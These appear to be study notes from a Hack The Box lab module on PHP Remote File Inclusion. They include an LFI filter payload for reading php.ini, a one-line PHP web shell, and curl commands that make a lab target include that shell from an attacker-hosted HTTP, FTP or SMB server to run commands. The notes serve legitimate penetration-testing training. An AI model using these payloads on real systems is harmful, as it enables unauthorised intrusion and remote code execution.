yWe may also be able to include remote files "[Remote File Inclusion (RFI)](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion)", if the vulnerable function allows the inclusion of remote URLs. This allows two main benefits:

1. Enumerating local-only ports and web applications (i.e. SSRF)
2. Gaining remote code execution by including a malicious script that we host

In this section, we will cover how to gain remote code execution through RFI vulnerabilities. The [Server-side Attacks](https://academy.hackthebox.com/module/details/145) module covers various `SSRF` techniques, which may also be used with RFI vulnerabilities.

### Verify RFI
Any remote URL inclusion in PHP would require the `allow_url_include` setting to be enabled.

We can use the LFI vulnerability
```bash
php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini
```

```bash
adot8@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP' | base64 -d | grep allow_url_include

allow_url_include = On
```

We can test RFI using the current page and localhost IP
```bash
curl http://10.10.10.10/index.php?language=http://127.0.0.1:80/index.php
```

If It's the same we can do the following

#### HTTP
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php

updog -p 80
```

```bash
curl http://10.10.10.10./index.php?language=http://10.10.15.155/shell.php&cmd=id
```

#### FTP
```bash
python -m pyftpdlib -p 21
```

```bash
curl http://10.10.10.10./index.php?language=ftp://10.10.15.155/shell.php&cmd=id
```

#### SMB
```bash
impacket-smbserver -smb2support share $(pwd)
```

```bash
curl http://10.10.10.10./index.php?language=\\10.10.15.155\share\shell.php&cmd=id
```